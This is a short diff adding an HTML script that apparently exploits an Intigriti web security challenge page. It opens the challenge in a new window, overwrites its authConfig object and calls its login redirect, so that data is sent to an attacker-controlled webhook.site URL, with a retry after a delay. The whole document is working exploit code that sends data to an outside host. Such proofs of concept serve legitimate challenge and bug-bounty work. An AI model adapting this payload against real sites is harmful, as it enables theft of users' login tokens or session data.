@@ -1,1 +1,18 @@
 
+<script>
+var webhook = 'https://webhook.site/961144e5-fb8e-4d33-abbc-dff6bd3aec13';
+var w = window.open('https://challenge-0326.intigriti.io/challenge.html?q=test');
+setTimeout(function() {
+  try {
+    w.authConfig = { dataset: { next: webhook, append: 'true' } };
+    w.Auth.loginRedirect({});
+  } catch(e) {
+    setTimeout(function() {
+      try {
+        w.authConfig = { dataset: { next: webhook, append: 'true' } };
+        w.Auth.loginRedirect({});
+      } catch(e2) {}
+    }, 3000);
+  }
+}, 3000);
+</script>
